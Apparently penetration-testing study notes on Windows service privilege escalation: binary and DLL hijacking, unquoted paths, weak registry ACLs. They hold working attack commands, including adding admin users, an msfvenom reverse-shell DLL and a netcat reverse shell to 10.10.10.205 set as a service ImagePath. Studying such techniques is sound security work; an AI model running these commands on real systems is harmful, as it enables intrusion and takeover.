* Basic commands for interacting with services:
	* Get-CimInstance: Get information on services using Get-CimInstance cmdlet.
		* Example command: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		* Note Get-CimInstance may not work if you are on a bind shell then use RDP.
	* `net [start|stop] <service>`: net command to interact with services.
	* `sc[.exe] <start|stop|query>`: start, stop, query status of services using sc.
	* `wmic service` or `_Get-WmiObject_ -Class Win32_Service`: Use wmi to list services .
	* `Get-Service`, `Start-Service`, `Stop-Service`, `Restart-Service`: Use PowerShell management to interact with services.
	* PsService from sysInternals suite can be used to check permissions on service and can interact remotely running services as well: `PsService.exe security <service name>`
* Service Binary Hijacking:
	* Manual:
		* Reveal all modifiable services and services binaries.
			* `SharpUp.exe audit`
		* Get permissions on the service binary:
			* icacls or Get-ACL or `accesschk.exe /accepteula -quvcw <service>`
		* If service can be modified then modify service binary path: `sc[.exe] config <service> binpath="cmd /c net localgroup administrators <user> /add"` then restart service.
		* If service binary can be modified:
			* Compile a malicious binary and try replacing the service binary. Restart service for the hijacked service to start.
			* The malicious binary can be anything like adding new user to admin group or reverse shells etc.
	* Automated service binary hijacking using Powersploit PowerUp.
		* Make sure to use execution bypass using: "powershell -ep Bypass"
		* Import the script using ". .\\PowerUp.ps1" provides cmdlets for service binary hijacking.
		* location on kali linux: /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
		* Get-ModifiableServiceFile: Displays services the current user can modify, such as the service binary or configuration files
		* Install-ServiceBinary: Replace the service binary and, if there are sufficient permissions, restart it. The default behavior is to create a new local user called john with the password Password123!
		* For more information refer to [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
	* Note: Depending on situation, automated tools can give wrong outputs. Switch to manual techniques if necessary.
* Service DLL Hijacking: Replace a DLL used by the service binary. This is an option if the binary cannot be modified by the current user permissions.
	* DLL search order: Below is how DLL is located before it is loaded.
		* The directory from which the application loaded.
		* The system directory.
		* The 16-bit system directory.
		* The Windows directory. 
		* The current directory.
		* The directories that are listed in the PATH environment variable.
		* [Microsoft documentation](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
	* Sysinternals Procmon: Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity.
		* Set filter to process name is `<binary name>`
		* Look for "CreateFile" events with states "NAME NOT FOUND" which are events for file creation or file open.
		* Find which file path are being searched for the DLLs. It should follow the DLL search order mentioned before.
		* [Microsoft documentation](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
	* DLLmain entry point: An optional entry point of a DLL which is executed when a DLL is loaded or unloaded by a process or thread.
		* Refer to the [Microsoft documentation](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library#the-dll-entry-point) and copy the code there. Make sure to include stdlib.h, windows.h headers.
		* Under switch case "DLL_PROCESS_ATTACH", add your code. Example: A system call to create a new user and to administrator group. This code will be executed when the DLL is loaded by the process.
		* Compile the DLL using x86_64-w64-mingw32-gcc using "--shared" flag on kali.
		* Place the DLL in the appropriate file path found using Sysinternals Procmon which you can place with your permissions. Make sure this malicious DLL is placed at a file path before or on the file path found using the DLL search order where the DLL would have been originally found and loaded.
	* Alternative is to use msfvenom to build a malicious DLL: `msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o msf.dll`
* Unquoted Service Path:
	* If a service path is unquoted in the registry configuration such as `C:\Program Files\My Program\My Service\service.exe` then below is the search order used to find the executed when the service is started:
		* C:\\Program.exe
		* C:\\Program Files\\My.exe
		* C:\\Program Files\\My Program\\My.exe
		* C:\\Program Files\\My Program\\My service\\service.exe
	* Since multiple file paths are searched, a malicious file can be placed on the earlier file paths to subvert original execution.
	* Enumerate services: Get-CimInstance -ClassName win32_service | Select Name,State,PathName
	* In cmd.exe use wmic to get services with unquoted paths much easier. Use findstr to remove any directories that the current user has no permissions for and paths with quotes: `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`
	* Stop the service and place the malicious executable in one of the earlier file paths from the search order. Use icacls or Accesschk.exe to determine if the current user has permission to write the executable on the file path.
	* Restart the service. The malicious executable should have been executed.
	* Automated way:
		* Use Powersploit powerup.
		* Import powerup in powershell with common code: ". .\\PowerUp.ps1"
		* Gets all unquoted services: Get-UnquotedService 
		* Write malicious service using: Write-ServiceBinary -Name '\<service name\>' -Path "\<hijack path\>"
		* Restart the service: Restart-Service
* Weak service ACLs in the Windows Registry:
	* Get ACLs for registry keys in `HKLM\SYSTEM\CurrentControlSet\Services` registry tree which stores information about each service on the system:
		* `accesschk.exe /accepteula "<user>" -kvuqsw hklm\System\CurrentControlSet\services`
	* For example if the registry `HKLM\System\CurrentControlSet\services\<Service>` registry is modifiable then modify its image path:
		* `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<Service> -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`